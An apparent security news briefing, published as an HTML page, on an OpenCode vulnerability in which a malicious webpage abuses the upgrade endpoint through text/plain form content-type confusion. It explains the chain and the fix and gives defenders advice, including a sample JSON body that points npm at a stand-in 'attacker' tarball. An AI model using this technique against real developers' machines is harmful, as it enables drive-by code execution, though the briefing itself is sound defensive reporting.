@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="google-adsense-account" content="ca-pub-9044791241492233">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>A Content-Type Confusion Turned OpenCode’s Upgrade Endpoint Into Drive-By RCE — al-ice.ai</title>
+  <meta name="description" content="GHSA-632h-h47v-g4x4 chains an install-target injection in OpenCode’s /global/upgrade endpoint with a text/plain content-type confusion, letting a malicious webpage run code on a developer’s machine. Version 1.18.22 is the fix; 1.14.30 through 1.18.21 are affected." />
+  <link rel="canonical" href="https://al-ice.ai/posts/2026/09/opencode-ghsa-632h-h47v-g4x4-upgrade-endpoint-rce/" />
+  <meta name="robots" content="index,follow" />
+  <meta name="post:title" content="A Content-Type Confusion Turned OpenCode’s Upgrade Endpoint Into Drive-By RCE" />
+  <meta name="post:date" content="2026-09-24" />
+  <meta name="post:category" content="ai-cves" />
+  <meta name="post:categoryLabel" content="AI Vulnerabilities &amp; CVEs" />
+  <meta name="post:author" content="al-ice.ai Editorial" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZX0TZSMV99"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZX0TZSMV99');</script>
+  <link rel="stylesheet" href="/assets/css/site.css" />
+  <script>(function(){try{var t=localStorage.getItem('theme');if(t==="retro")document.documentElement.setAttribute('data-theme','retro');}catch(e){}})();</script>
+</head>
+<body>
+  <div class="wrap">
+    <header class="site">
+      <div class="brand"><a href="/">al-ice.ai</a></div>
+      <nav class="small">
+        <a href="/posts/">Posts</a>
+        <a href="/categories/">Categories</a>
+        <a href="/search/">Search</a>
+        <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle CRT mode"></button>
+</nav>
+    </header>
+    <main>
+      <article class="post">
+        <h1 class="post-title">A Content-Type Confusion Turned OpenCode’s Upgrade Endpoint Into Drive-By RCE</h1>
+        <div class="post-meta">
+          <time datetime="2026-09-24">2026-09-24</time>
+          <a class="badge" href="/categories/ai-cves/">AI Vulnerabilities &amp; CVEs</a>
+          <span class="post-author">by al-ice.ai Editorial</span>
+        </div>
+
+        <p>OpenCode is an open-source AI coding agent that launched in June 2025 and, by its own account, has since grown past 200,000 GitHub stars and 16 million monthly users. On September 24, <a href="https://securitylabs.datadoghq.com/articles/opencode-upgrade-remote-code-execution/?utm_source=al-ice.ai&utm_medium=referral&utm_campaign=posts" rel="noopener">Datadog Security Labs</a> published <strong>GHSA-632h-h47v-g4x4</strong>, a remote code execution chain in OpenCode’s local web interface that a malicious webpage can trigger with no clicks beyond the visit itself. The fixed release is <strong>1.18.22</strong>; versions <strong>1.14.30 through 1.18.21</strong> installed via npm, pnpm, or Bun are affected. Notably, there is no CVE: maintainer Anomaly declined to request one, arguing that CVEs on GitHub advisories incentivize high-volume, low-quality reports.</p>
+        <p>The chain has two links, and neither is exotic. The <code>POST /global/upgrade</code> endpoint interpolates its <code>target</code> parameter into a package-manager install command — <code>npm install -g opencode-ai@&lt;target&gt;</code> — and npm accepts remote tarball URLs as install targets, so a <code>target</code> pointing at an attacker-hosted tarball with a <code>preinstall</code> script is arbitrary command execution. The second link is what makes it reachable from a browser: the handler reads the raw body and parses it as JSON without checking the <code>Content-Type</code> header, so a cross-origin HTML form submitted as <code>text/plain</code> can smuggle a valid JSON body past the same-origin policy’s preflight rules.</p>
+
+        <h2>The form trick is the whole story</h2>
+        <p>A standard form submission sends <code>application/x-www-form-urlencoded</code>, which the endpoint rejects with a 400 — and HTML forms cannot send <code>application/json</code> at all. But <code>text/plain</code> is a permitted form encoding, browsers do not escape or URL-encode <code>text/plain</code> field names and values, and the server never verifies the content type. Datadog’s researchers therefore shaped a field name and value that, joined by the <code>=</code> the browser inserts between them, assemble into <code>{“target”:“http://attacker/opencode-malicious.tgz”,…}</code>. Because <code>text/plain</code> POSTs are CORS “simple requests” sent as top-level navigations, no preflight OPTIONS call warns the victim or gives the server a chance to refuse — the request simply arrives, parses, and upgrades the developer’s tooling from an attacker’s tarball.</p>
+        <p>Datadog verified the full chain against OpenCode 1.18.21: visiting the page ran the tarball’s <code>preinstall</code> script on the victim’s machine. The vulnerable code path dates to April 2026, and the advisory’s own telemetry is sobering — the 82 vulnerable versions drew more than 647,000 npm downloads in the single week of September 17–23, roughly 39% of all OpenCode downloads that week. Download counts are not victim counts, but the install base running <code>opencode serve</code> or <code>opencode web</code> is large enough that drive-by exposure cannot be assumed away.</p>
+
+        <h2>Authentication helps less than you would hope</h2>
+        <p>The web interface ships with no authentication unless <code>OPENCODE_SERVER_PASSWORD</code> is set — the CLI itself prints “server is unsecured” when it is missing. Enabling the password is still worth doing, but Datadog notes the caveat that browsers cache HTTP basic-auth credentials for the life of the browser process. A developer who authenticated recently and then browses to a malicious page may send the upgrade request with cached credentials attached, satisfying the very gate meant to stop it. Password protection on a loopback listener is a speed bump against exactly the attacker this chain assumes: one who can already get the victim’s browser to issue requests.</p>
+
+        <h2>The fix draws two lines, and both were needed</h2>
+        <p>Anomaly’s patch (<a href="https://github.com/anomalyco/opencode/pull/44686?utm_source=al-ice.ai&utm_medium=referral&utm_campaign=posts" rel="noopener">PR #44686</a>, merged August 24) addresses each link independently. The <code>target</code> field now validates as a strict semantic version, so tarball URLs are rejected before any package manager is invoked. Separately, the endpoint moved from a raw-body handler to a content-type-aware one, so a <code>text/plain</code> body is refused with 415 Unsupported Media Type instead of being parsed as JSON. Either change alone breaks this particular chain; together they close the underlying injection and the confusion that exposed it. Datadog reported the flaw on August 11 and held publication for a month at Anomaly’s request to widen the patching window.</p>
+
+        <h2>What defenders should do now</h2>
+        <ul>
+          <li><strong>Upgrade to OpenCode 1.18.22 or later.</strong> Check the running binary, not just the manifest — and confirm how it was installed with <code>ls -l “$(command -v opencode)”</code>. Only npm, pnpm, and Bun installs take the vulnerable code path.</li>
+          <li><strong>Set <code>OPENCODE_SERVER_PASSWORD</code> if you expose serve or web beyond loopback.</strong> Treat it as one layer, not the fix: cached browser credentials can satisfy it during a drive-by.</li>
+          <li><strong>Keep the listener on loopback.</strong> The exploit is a cross-origin request to <code>127.0.0.1:4096</code> from any malicious page; anything that widens that listener’s reach widens the attacker population from “pages you visit” to “hosts that can reach you.”</li>
+          <li><strong>Hunt for upgrade artifacts on developer machines.</strong> Unexpected <code>opencode-ai</code> reinstalls, unfamiliar global packages, <code>preinstall</code> executions, and outbound connections from the package manager to unknown hosts around browsing sessions are the traces that matter.</li>
+          <li><strong>Do not wait for a CVE to trigger your process.</strong> Anomaly explicitly will not mint one for this class of advisory. If your triage pipeline keys off CVE identifiers, GHSA-632h-h47v-g4x4 is the test case that proves the gap — ingest GitHub advisories for the AI tooling your developers actually run.</li>
+        </ul>
+
+        <p>This is the third item this month in a grim coding-agent pattern. <a href="/posts/2026/09/plugin4shell-zero-click-rce-coding-agent-sha-pin-bypass/">Plugin4Shell</a> broke plugin integrity checks for zero-click RCE across four mainstream agents, and the <a href="/posts/2026/09/cua-autoagent-unauthenticated-control-server-rce-cves/">Cua and AutoAgent control servers</a> exposed unauthenticated command execution on the network. OpenCode adds the browser as the delivery mechanism: the developer does not need to install anything malicious, approve anything, or even leave the page. Local-first agent tooling that binds a privileged HTTP listener is remote attack surface the moment a browser exists on the same machine — architect it accordingly.</p>
+
+        <p><strong>Sources:</strong></p>
+        <ul>
+          <li><a href="https://securitylabs.datadoghq.com/articles/opencode-upgrade-remote-code-execution/?utm_source=al-ice.ai&utm_medium=referral&utm_campaign=posts" rel="noopener">Datadog Security Labs — Discovering and exploiting a remote code execution vulnerability in OpenCode (GHSA-632h-h47v-g4x4), September 24, 2026</a></li>
+          <li><a href="https://github.com/anomalyco/opencode/security/advisories/GHSA-632h-h47v-g4x4?utm_source=al-ice.ai&utm_medium=referral&utm_campaign=posts" rel="noopener">Anomaly OpenCode advisory GHSA-632h-h47v-g4x4</a></li>
+          <li><a href="https://github.com/anomalyco/opencode/pull/44686?utm_source=al-ice.ai&utm_medium=referral&utm_campaign=posts" rel="noopener">Anomaly OpenCode PR #44686 — upgrade target and content-type fix</a></li>
+          <li><a href="https://www.npmjs.com/package/opencode-ai?utm_source=al-ice.ai&utm_medium=referral&utm_campaign=posts" rel="noopener">npm — opencode-ai package versions</a></li>
+        </ul>
+      </article>
+<aside class="related-intelligence" data-related-intelligence aria-labelledby="related-title">
+      <div class="related-heading"><div><span class="eyebrow">Continue the investigation</span><h2 id="related-title">Related intelligence</h2></div><a href="/categories/ai-cves/">View category →</a></div>
+      <div class="related-grid"><article class="related-card"><div class="post-meta"><time datetime="2026-06-30">2026-06-30</time><span class="badge">AI Vulnerabilities &amp; CVEs</span></div><h3><a href="/posts/2026/06/cursor-cve-2026-26268-sandbox-escape-ai-coding-agent/">Cursor CVE-2026-26268 — Sandbox Escape Lets Attackers Achieve RCE via Prompt Injection in AI Coding Agent</a></h3><p>Critical sandbox escape in Cursor AI editor chains prompt injection through MCP manipulation to achieve arbitrary code execution on developer machines.</p><a class="text-link" href="/posts/2026/06/cursor-cve-2026-26268-sandbox-escape-ai-coding-agent/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-09-24">2026-09-24</time><span class="badge">AI Vulnerabilities &amp; CVEs</span></div><h3><a href="/posts/2026/09/bifrost-ai-gateway-unauthenticated-rce-insecure-admin-default/">Bifrost’s Off-by-Default Admin Auth Turned an AI Gateway Into Two Unauthenticated RCE Paths</a></h3><p>CVE-2026-90898 lets an unauthenticated caller run commands through Bifrost’s MCP stdio registration, and a second advisory reaches code execution through remote Go plugin loading. Transport 2.1.0 is the remediation floor.</p><a class="text-link" href="/posts/2026/09/bifrost-ai-gateway-unauthenticated-rce-insecure-admin-default/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-07-26">2026-07-26</time><span class="badge">AI Vulnerabilities &amp; CVEs</span></div><h3><a href="/posts/2026/07/claude-code-git-worktree-sandbox-escape-cve-2026-55607/">A Malicious Repository Could Drive Claude Code Out of Its Sandbox — CVE-2026-55607</a></h3><p>CVE-2026-55607 chained prompt injection, Git worktree confusion, symlinks, and fsmonitor to escape Claude Code’s macOS sandbox. Upgrade to 2.1.163 or later.</p><a class="text-link" href="/posts/2026/07/claude-code-git-worktree-sandbox-escape-cve-2026-55607/">Read briefing →</a></article></div>
+    </aside>
+    </main>
+    <footer class="small muted"><div><a href="/posts/">← All posts</a> • <a href="/sitemap.xml">Sitemap</a></div></footer>
+  </div>
+  <script>(function(){
+      var btn=document.getElementById('themeToggle');
+      if(!btn) return;
+
+      function isRetro(){ return document.documentElement.getAttribute('data-theme')==='retro'; }
+
+      function crtIcon(){
+        // Animated CRT icon (gif)
+        return '<img class="theme-ico" src="/assets/img/crt.gif" alt="" aria-hidden="true" />';
+      }
+
+      function flatIcon(){
+        return '<svg class="theme-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-5l1 2H8l1-2H6a2 2 0 0 1-2-2V6Zm2 0v9h12V6H6Z"/></svg>';
+      }
+
+      function render(){
+        if(isRetro()){
+          btn.classList.add('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + flatIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">Modern</span>';
+          btn.setAttribute('title','Switch to modern');
+          btn.setAttribute('aria-label','Switch to modern');
+        }else{
+          btn.classList.remove('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + crtIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">CRT</span>';
+          btn.setAttribute('title','Toggle CRT (80/90s) vibe');
+          btn.setAttribute('aria-label','Toggle CRT (80/90s) vibe');
+        }
+      }
+
+      function pulse(anim){
+        try{
+          btn.classList.remove('anim-connect','anim-disconnect');
+          // force reflow so the animation re-triggers
+          void btn.offsetWidth;
+          btn.classList.add(anim);
+          window.setTimeout(function(){ btn.classList.remove(anim); }, 700);
+        }catch(e){}
+      }
+
+      function setRetro(on){
+        if(on){
+          pulse('anim-connect');
+          document.documentElement.setAttribute('data-theme','retro');
+          try{ localStorage.setItem('theme','retro'); }catch(e){}
+        }else{
+          pulse('anim-disconnect');
+          document.documentElement.removeAttribute('data-theme');
+          try{ localStorage.removeItem('theme'); }catch(e){}
+        }
+        render();
+      }
+
+      render();
+      btn.addEventListener('click', function(){ setRetro(!isRetro()); });
+    })();</script>
+</body>
+</html>
